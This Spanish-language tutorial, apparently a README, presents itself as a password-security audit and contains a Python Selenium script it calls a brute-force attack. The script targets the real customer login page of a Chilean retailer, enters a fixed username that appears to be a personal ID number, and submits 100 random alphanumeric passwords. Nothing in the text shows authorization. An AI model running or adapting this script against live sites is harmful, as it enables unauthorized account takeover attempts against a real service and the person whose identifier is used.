# Automatización de credenciales con python y selenium
Auditar la implementación de los sistemas de creación, actualización, acceso, transmisión y recuperación de contraseñas

## Selenium 
Selenium es un entorno de pruebas que se utiliza para automatizar servicios de sowftware.

## Instalación
Usa el pip en la consola para instalar el paquete de selenium.

```bash
pip install selenium
```
## Ejemplo de uso de python con selenium (ataque fuerza bruta)

```python
import string
import time
import random

#Carga el módulo webdriver para implementar las clases y métodos para el soporte de los diferentes navegadores
from selenium import webdriver

#Carga la configuración del teclado virtual para simular las entradas de teclado
from selenium.webdriver.common.keys import Keys

#Crea una instancia de Chrome que se pueda controlar con comandos de selenium.
driver = webdriver.Chrome()

#Llama a la página chilena, que será la base para las interacciones automatizadas
driver.get('https://www.wei.cl/cliente/ingreso')
time.sleep(5)
#variable que contendrá carácteres uppercase, lowercase y digitos del 0-9, es decir base 62
letters = string.ascii_letters + string.digits

#Inicia la automatiación de 100 accesos (verifica si el sitio web es susceptible a ataques por fuerza bruta) 
for x in range(100):

    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''access login''
    usr = driver.find_element_by_id("client-username")
    usr.clear()
    usr.send_keys("20189579-0")
    psw = driver.find_element_by_id("client-password")
    str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
    
    #Se introduce el valor que contiene la variable password
    psw.send_keys(str)
    print(str)
    
    #Está variable permite efectuar un evento click a la página web mediante el xpath
    clk = driver.find_element_by_xpath('//*[@id="form-ingreso-window"]/button').submit()
    time.sleep(1)
    psw.clear()
```
